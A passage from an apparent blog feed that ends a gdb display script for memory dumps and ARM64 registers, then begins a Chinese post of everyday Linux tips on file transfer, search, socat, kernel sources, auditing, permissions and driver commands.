$arg0</span><br><span class="line">        end</span><br><span class="line">        echo \033[0m</span><br><span class="line">        hex_dword $arg0</span><br><span class="line">        printf &quot; &quot;</span><br><span class="line">        echo \033[1m</span><br><span class="line">        ascii_char (char*)$arg0+0x0</span><br><span class="line">        ascii_char (char*)$arg0+0x1</span><br><span class="line">        ascii_char (char*)$arg0+0x2</span><br><span class="line">        ascii_char (char*)$arg0+0x3</span><br><span class="line">        ascii_char (char*)$arg0+0x4</span><br><span class="line">        ascii_char (char*)$arg0+0x5</span><br><span class="line">        ascii_char (char*)$arg0+0x6</span><br><span class="line">        ascii_char (char*)$arg0+0x7</span><br><span class="line">        ascii_char (char*)$arg0+0x8</span><br><span class="line">        ascii_char (char*)$arg0+0x9</span><br><span class="line">        ascii_char (char*)$arg0+0xA</span><br><span class="line">        ascii_char (char*)$arg0+0xB</span><br><span class="line">        ascii_char (char*)$arg0+0xC</span><br><span class="line">        ascii_char (char*)$arg0+0xD</span><br><span class="line">        ascii_char (char*)$arg0+0xE</span><br><span class="line">        ascii_char (char*)$arg0+0xF</span><br><span class="line">        echo \033[0m</span><br><span class="line">        printf &quot;\n&quot;</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document hexDwordDump</span><br><span class="line">Display a 16-byte hex/ASCII dump of memory at address ADDR.</span><br><span class="line">Usage: hexDwordDump ADDR</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define hexQwordDump</span><br><span class="line">    if $argc != 1</span><br><span class="line">        help hexQwordDump</span><br><span class="line">    else</span><br><span class="line">        echo \033[1m</span><br><span class="line">        if ($64BITS == 1)</span><br><span class="line">         printf &quot;0x%016lX : &quot;, $arg0</span><br><span class="line">        else</span><br><span class="line">         printf &quot;0x%08X : &quot;, $arg0</span><br><span class="line">        end</span><br><span class="line">        echo \033[0m</span><br><span class="line">        hex_qword $arg0</span><br><span class="line">        printf &quot; &quot;</span><br><span class="line">        echo \033[1m</span><br><span class="line">        ascii_char (char*)$arg0+0x0</span><br><span class="line">        ascii_char (char*)$arg0+0x1</span><br><span class="line">        ascii_char (char*)$arg0+0x2</span><br><span class="line">        ascii_char (char*)$arg0+0x3</span><br><span class="line">        ascii_char (char*)$arg0+0x4</span><br><span class="line">        ascii_char (char*)$arg0+0x5</span><br><span class="line">        ascii_char (char*)$arg0+0x6</span><br><span class="line">        ascii_char (char*)$arg0+0x7</span><br><span class="line">        ascii_char (char*)$arg0+0x8</span><br><span class="line">        ascii_char (char*)$arg0+0x9</span><br><span class="line">        ascii_char (char*)$arg0+0xA</span><br><span class="line">        ascii_char (char*)$arg0+0xB</span><br><span class="line">        ascii_char (char*)$arg0+0xC</span><br><span class="line">        ascii_char (char*)$arg0+0xD</span><br><span class="line">        ascii_char (char*)$arg0+0xE</span><br><span class="line">        ascii_char (char*)$arg0+0xF</span><br><span class="line">        echo \033[0m</span><br><span class="line">        printf &quot;\n&quot;</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document hexQwordDump</span><br><span class="line">Display a 16-byte hex/ASCII dump of memory at address ADDR.</span><br><span class="line">Usage: hexQwordDump ADDR</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># _______________data window__________________</span><br><span class="line">define ddump</span><br><span class="line">    if $argc != 2</span><br><span class="line">        help ddump</span><br><span class="line">    else</span><br><span class="line">        echo \033[34m</span><br><span class="line">        if $ARM == 1</span><br><span class="line">            printf &quot;[0x%08X]&quot;, $data_addr</span><br><span class="line">        else</span><br><span class="line">            if ($64BITS == 1)</span><br><span class="line">             printf &quot;[0x%04X:0x%016lX]&quot;, $ds, $data_addr</span><br><span class="line">            else</span><br><span class="line">             printf &quot;[0x%04X:0x%08X]&quot;, $ds, $data_addr</span><br><span class="line">            end</span><br><span class="line">        end</span><br><span class="line">    echo \033[34m</span><br><span class="line">    printf &quot;------------------------&quot;</span><br><span class="line">    printf &quot;-------------------------------&quot;</span><br><span class="line">    if ($64BITS == 1)</span><br><span class="line">     printf &quot;-------------------------------------&quot;</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    echo \033[1;34m</span><br><span class="line">    printf &quot;[data]\n&quot;</span><br><span class="line">        echo \033[0m</span><br><span class="line">        set $_count = 0</span><br><span class="line">        while ($_count &lt; $arg1)</span><br><span class="line">            set $_i = ($_count * 0x10)</span><br><span class="line">            if $arg0 == 1</span><br><span class="line">                hexdump $data_addr+$_i</span><br><span class="line">            end</span><br><span class="line">            if $arg0 == 2</span><br><span class="line">                hexDwordDump $data_addr+$_i</span><br><span class="line">            end</span><br><span class="line">            if $arg0 == 3</span><br><span class="line">                hexQwordDump $data_addr+$_i</span><br><span class="line">            end</span><br><span class="line">            set $_count++</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document ddump</span><br><span class="line">Display NUM lines of hexdump for address in $data_addr global variable.</span><br><span class="line">Usage: ddump TYPE NUM</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define db</span><br><span class="line">    if($argc != 1 &amp;&amp; $argc != 2)</span><br><span class="line">        help db</span><br><span class="line">    else</span><br><span class="line">        set $data_addr = (char*)$arg0</span><br><span class="line">        if($argc == 1)</span><br><span class="line">            ddump 1 5</span><br><span class="line">        else</span><br><span class="line">            ddump 1 $arg1</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document db</span><br><span class="line">Display 16 lines of a hex dump of address starting at ADDR.</span><br><span class="line">Usage: db ADDR LINE</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define dd</span><br><span class="line">    if($argc != 1 &amp;&amp; $argc != 2)</span><br><span class="line">        help dd</span><br><span class="line">    else</span><br><span class="line">        set $data_addr = (char*)$arg0</span><br><span class="line">        if($argc == 1)</span><br><span class="line">            ddump 2 5</span><br><span class="line">        else</span><br><span class="line">            ddump 2 $arg1</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document dd</span><br><span class="line">Display 16 lines of a hex dump of address starting at ADDR.</span><br><span class="line">Usage: dd ADDR LINE</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define dq</span><br><span class="line">    if($argc != 1 &amp;&amp; $argc != 2)</span><br><span class="line">        help dq</span><br><span class="line">    else</span><br><span class="line">        set $data_addr = (char*)$arg0</span><br><span class="line">        if($argc == 1)</span><br><span class="line">            ddump 3 8</span><br><span class="line">        else</span><br><span class="line">            ddump 3 $arg1</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document dq</span><br><span class="line">Display 16 lines of a hex dump of address starting at ADDR.</span><br><span class="line">Usage: dq ADDR LINE</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define reg</span><br><span class="line">    printf &quot;  &quot;</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x0:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x0</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x1:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x1</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x2:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x2</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x3:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x3</span><br><span class="line">    echo \033[32m</span><br><span class="line">    echo \n</span><br><span class="line">    printf &quot;$x4:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x4</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x5:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x5</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x6:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x6</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x7:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x7</span><br><span class="line">    echo \033[32m</span><br><span class="line">    echo \n</span><br><span class="line">    printf &quot;$x8:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x8</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x9:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x9</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x10:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x10</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x11:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x11</span><br><span class="line">    echo \033[32m</span><br><span class="line">    echo \n</span><br><span class="line">    printf &quot;$x12:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x12</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x13:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x13</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x14:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x14</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x15:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x15</span><br><span class="line">    echo \033[32m</span><br><span class="line">    echo \n</span><br><span class="line">    printf &quot;$x16:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x16</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x17:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x17</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x18:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x18</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x19:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x19</span><br><span class="line">    echo \033[32m</span><br><span class="line">    echo \n</span><br><span class="line">    printf &quot;$x20:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x20</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x21:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x21</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x22:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x22</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x23:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x23</span><br><span class="line">    echo \033[32m</span><br><span class="line">    echo \n</span><br><span class="line">    printf &quot;$x24:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x24</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x25:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x25</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x26:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x26</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x27:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x27</span><br><span class="line">    echo \033[32m</span><br><span class="line">    echo \n</span><br><span class="line">    printf &quot;$x28:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x28</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x29:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x29</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$x30:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $x30</span><br><span class="line">    echo \033[32m</span><br><span class="line">    echo \n</span><br><span class="line">    printf &quot;$sp:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $sp</span><br><span class="line">    echo \033[32m</span><br><span class="line">    printf &quot;$pc:&quot;</span><br><span class="line">    echo \033[0m</span><br><span class="line">    printf &quot; 0x%016lX  &quot;, $pc</span><br><span class="line">    echo \033[0m</span><br><span class="line">    echo \n</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define context</span><br><span class="line">reg</span><br><span class="line">x/8i $pc</span><br><span class="line">dq $sp 3</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define hook-stop</span><br><span class="line">    # this makes &#x27;context&#x27; be called at every BP/step</span><br><span class="line">    if ($SHOW_CONTEXT &gt; 0)</span><br><span class="line">        context</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document hook-stop</span><br><span class="line">!!! FOR INTERNAL USE ONLY - DO NOT CALL !!!</span><br><span class="line">end</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;官方虽然有不少资料, 但是都很分散, 我整理一下关于rk3568的测试资料, 方便大家参考.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux 使用技巧</title>
    <link href="http://474172261.github.io/2023/02/22/linux-skill/"/>
    <id>http://474172261.github.io/2023/02/22/linux-skill/</id>
    <published>2023-02-22T11:54:44.212Z</published>
    <updated>2024-07-01T07:25:46.400Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>不定期更新</p></blockquote><h2 id="两个linux文件互传"><a href="#两个linux文件互传" class="headerlink" title="两个linux文件互传"></a>两个linux文件互传</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ scp -r linux-2.6.26 root@(目标ip)IP:/usr/src/(假设放到/usr/src路径)</span><br></pre></td></tr></table></figure><h2 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a>文件查找</h2><p>将当前目录及其子目录下所有文件后缀为 .c 的文件列出来:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find . -name &quot;*.c&quot;</span><br></pre></td></tr></table></figure><blockquote><p>find默认不查找软链接的文件夹, 所以, 可以加<code>-L</code>解决这个问题, 这个很重要!!!!!!</p></blockquote><h2 id="将一个本地程序做成一个本地服务程序"><a href="#将一个本地程序做成一个本地服务程序" class="headerlink" title="将一个本地程序做成一个本地服务程序"></a>将一个本地程序做成一个本地服务程序</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ socat tcp-l:2333,reuseaddr,fork <span class="built_in">exec</span>:./pwn1</span><br></pre></td></tr></table></figure><p>服务端口在2333，使用nc 127.0.0.1 2333连接</p><h2 id="获取ubuntu当前内核的源码"><a href="#获取ubuntu当前内核的源码" class="headerlink" title="获取ubuntu当前内核的源码"></a>获取ubuntu当前内核的源码</h2><p>进入<a href="https://launchpad.net/ubuntu/">lauchpad</a>, 分清你的系统名称, 比如 20.04 叫 Focal Fossa, 系统当前版本:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">uname</span> -r</span><br><span class="line">5.13.0-35-generic</span><br></pre></td></tr></table></figure><p>那么我们在页面的以下部分会看到以下部分的内容</p><p><strong>Active series and milestones</strong></p><ul><li><p><strong><a href="https://launchpad.net/ubuntu/jammy">22.04 “Jammy” series </a></strong>- development<br>Milestones: <a href="https://launchpad.net/ubuntu/+milestone/jammy-updates">jammy-updates</a>, <a href="https://launchpad.net/ubuntu/+milestone/ubuntu-22.04">ubuntu-22.04</a>, <a href="https://launchpad.net/ubuntu/+milestone/ubuntu-22.04-beta">ubuntu-22.04-beta</a>, <a href="https://launchpad.net/ubuntu/+milestone/ubuntu-22.03">ubuntu-22.03</a>, <a href="https://launchpad.net/ubuntu/+milestone/ubuntu-22.02">ubuntu-22.02</a>, <a href="https://launchpad.net/ubuntu/+milestone/ubuntu-22.04-feature-freeze">ubuntu-22.04-feature-freeze</a>, <a href="https://launchpad.net/ubuntu/+milestone/ubuntu-22.01">ubuntu-22.01</a>, <a href="https://launchpad.net/ubuntu/+milestone/ubuntu-21.12">ubuntu-21.12</a>, and <a href="https://launchpad.net/ubuntu/+milestone/ubuntu-21.11">ubuntu-21.11</a></p></li><li><p><strong><a href="https://launchpad.net/ubuntu/impish">21.10 “Impish” series </a></strong>- current<br>Milestones: <a href="https://launchpad.net/ubuntu/+milestone/impish-updates">impish-updates</a></p></li><li><p><strong><a href="https://launchpad.net/ubuntu/focal">20.04 “Focal” series </a></strong>- supported &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br>Milestones: <a href="https://launchpad.net/ubuntu/+milestone/focal-updates">focal-updates</a> and <a href="https://launchpad.net/ubuntu/+milestone/ubuntu-20.04.4">ubuntu-20.04.4</a></p></li><li><p><strong><a href="https://launchpad.net/ubuntu/bionic">18.04 “Bionic” series </a></strong>- supported<br>Milestones: <a href="https://launchpad.net/ubuntu/+milestone/bionic-updates">bionic-updates</a></p></li><li><p><strong><a href="https://launchpad.net/ubuntu/xenial">16.04 “Xenial” series </a></strong>- supported<br>Milestones: <a href="https://launchpad.net/ubuntu/+milestone/xenial-updates">xenial-updates</a></p></li><li><p><strong><a href="https://launchpad.net/ubuntu/trusty">14.04 “Trusty” series </a></strong>- supported<br>Milestones: <a href="https://launchpad.net/ubuntu/+milestone/ubuntu-14.04.6">ubuntu-14.04.6</a></p></li><li><p><a href="https://launchpad.net/ubuntu/+series">All series</a> </p></li><li><p><a href="https://launchpad.net/ubuntu/+milestones">All milestones</a></p></li></ul><p>点击其中的<code>focal series</code>, 会出现搜索框, 我们就搜索<code>linux-image-5.13.0-35-generic</code>, 会得到如下几个结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> linux-image-5.13.0-35-generic: &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">Signed kernel image generic</span><br><span class="line"> linux-image-5.13.0-35-generic-dbgsym:</span><br><span class="line">Signed kernel image generic</span><br><span class="line"> linux-image-5.13.0-35-generic-lpae:</span><br><span class="line">Linux kernel image for version 5.13.0 on ARM (hard float) SMP</span><br><span class="line"> linux-image-5.13.0-35-generic-lpae-dbgsym:</span><br><span class="line">Linux kernel debug image for version 5.13.0 on ARM (hard float) SMP</span><br><span class="line"> linux-image-5.13.0-35-generic-64k:</span><br><span class="line">Signed kernel image generic-64k</span><br><span class="line"> linux-image-5.13.0-35-generic-64k-dbgsym:</span><br><span class="line">Signed kernel image generic-64k</span><br></pre></td></tr></table></figure><p>选择第一个, 出现如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Signed kernel image generic</span><br><span class="line"> A kernel image for generic. This version of it is signed with</span><br><span class="line"> Canonical&#x27;s UEFI/Opal signing key.</span><br><span class="line"></span><br><span class="line">Source package</span><br><span class="line">linux-signed-hwe-5.13 5.13.0-35.40~20.04.1 source package in Ubuntu  &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line"></span><br><span class="line">Published versions</span><br><span class="line">linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in amd64 (Updates)</span><br><span class="line">linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in amd64 (Security)</span><br><span class="line">linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in arm64 (Updates)</span><br><span class="line">linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in arm64 (Security)</span><br><span class="line">linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in armhf (Updates)</span><br><span class="line">linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in armhf (Security)</span><br><span class="line">linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in ppc64el (Updates)</span><br><span class="line">linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in ppc64el (Security)</span><br><span class="line">linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in s390x (Updates)</span><br><span class="line">linux-image-5.13.0-35-generic 5.13.0-35.40~20.04.1 in s390x (Security)</span><br></pre></td></tr></table></figure><p>此处我选Source package下的链接. 之后选择downloads里的tar.xz文件即可.</p><blockquote><p>这个版本的文件里包含的是一个下载脚本, 并没有包含完整的src文件. 所以还是需要想想其它办法直接获得文件最好.</p></blockquote><h2 id="快速转换图片格式，修改分辨率"><a href="#快速转换图片格式，修改分辨率" class="headerlink" title="快速转换图片格式，修改分辨率"></a>快速转换图片格式，修改分辨率</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ convert -resize 100x100 src.jpg dst.jpg</span><br><span class="line">$ convert -resize 50%x50% src.jpg dst.jpg</span><br></pre></td></tr></table></figure><h2 id="修改文件的用户"><a href="#修改文件的用户" class="headerlink" title="修改文件的用户"></a>修改文件的用户</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查看归属：</span><br><span class="line">$ <span class="built_in">ls</span> -l file</span><br><span class="line"></span><br><span class="line">赋给用户hv</span><br><span class="line">$ <span class="built_in">chown</span> hv:hv file</span><br><span class="line"></span><br><span class="line">如果需要把某个文件夹下所有都付给某个用户</span><br><span class="line">$ <span class="built_in">chown</span> hv:hv -R <span class="built_in">dir</span>/*</span><br></pre></td></tr></table></figure><h2 id="使用audit记录创建的程序"><a href="#使用audit记录创建的程序" class="headerlink" title="使用audit记录创建的程序"></a>使用audit记录创建的程序</h2><p>audit是记录linux审计信息的内核模块。<br>他记录系统中的各种动作和事件，比如系统调用，文件修改，执行的程序，系统登入登出和记录所有系统中所有的事件。audit还可以将审计记录写入日志文件。</p><p>如果想记录新创建的process, 可以直接修改<code>/etc/audit/audit.rules</code>, 添加一行<code>-a task,always</code>, 之后通过<code>cat /var/log/audit/audit.log|grep EXECVE</code> 来筛选你想要的记录.</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ auditctl -a exit,always -F arch=b64 -S execve 添加execve检测</span><br><span class="line">$ auditctl -D 删除所有规则</span><br></pre></td></tr></table></figure><p>更多可以参考<a href="https://www.cnblogs.com/gean/p/13749550.html">linux监控工具audit</a></p><h2 id="修改terminal的显示路径"><a href="#修改terminal的显示路径" class="headerlink" title="修改terminal的显示路径"></a>修改terminal的显示路径</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim ~/.bashrc</span><br></pre></td></tr></table></figure><p>找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## If this is an xterm set the title to user@host:dir</span><br><span class="line">case “$TERM” in</span><br><span class="line">xterm|rxvt)</span><br><span class="line">PS1=”\e]0;$debianchroot:+($debianchroot)\u@\h:\w\a$PS1”</span><br></pre></td></tr></table></figure><p>将PS1那行修改为(其实就是把w换成W)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS1=”[\u@\h:\W]\\$”</span><br></pre></td></tr></table></figure><h2 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/victorv</span><br></pre></td></tr></table></figure><h2 id="创建terminal的快捷键"><a href="#创建terminal的快捷键" class="headerlink" title="创建terminal的快捷键"></a>创建terminal的快捷键</h2><p>如果是在kali，terminal是没有快捷键的，到设置的keyboard里面，添加自定义快捷键，键值为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnome-terminal</span><br></pre></td></tr></table></figure><p>或者安装nautilus-open-terminal</p><h2 id="gdb改变汇编代码显示方式"><a href="#gdb改变汇编代码显示方式" class="headerlink" title="gdb改变汇编代码显示方式"></a>gdb改变汇编代码显示方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set disas intel</span><br></pre></td></tr></table></figure><p>设置反汇编代码使用的指令集，可选择 intel 指令集或 AT&amp;T指令集.</p><h2 id="usb驱动相关"><a href="#usb驱动相关" class="headerlink" title="usb驱动相关"></a>usb驱动相关</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">查找usb驱动</span><br><span class="line">$ sudo lspci</span><br><span class="line">…</span><br><span class="line">02:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111/8168B PCI Express Gigabit Ethernet controller (rev 01)</span><br><span class="line">$ find /sys | grep drivers.*02:00</span><br><span class="line"></span><br><span class="line">获取usb设备信息</span><br><span class="line">lsusb -t</span><br><span class="line"><span class="built_in">cat</span> /proc/bus/usb/devices</span><br><span class="line">lshw</span><br><span class="line"></span><br><span class="line">卸载usb驱动</span><br><span class="line">tree /sys/bus/usb/drivers</span><br><span class="line"><span class="built_in">echo</span> -n “1-1:1.0” &gt; /sys/bus/usb/drivers/ub/unbind</span><br></pre></td></tr></table></figure><h2 id="centos安装内核header"><a href="#centos安装内核header" class="headerlink" title="centos安装内核header"></a>centos安装内核header</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install kernel-devel-$(<span class="built_in">uname</span> -r) kernel-headers-$(<span class="built_in">uname</span> -r)</span><br></pre></td></tr></table></figure><p>如果遇到没有搜索结果, 可以做如下操作:</p><ol><li>查看当前版本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@centos~]<span class="comment"># cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.4.1708 (Core)</span><br></pre></td></tr></table></figure></li><li>修改文件<code>/etc/yum.repos.d/CentOS-Vault.repo</code>, 添加当前版本的以下信息:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[C(Your Version Number)-base] 比如 [C5.6-base]</span><br><span class="line">name=CentOS-(Your Version 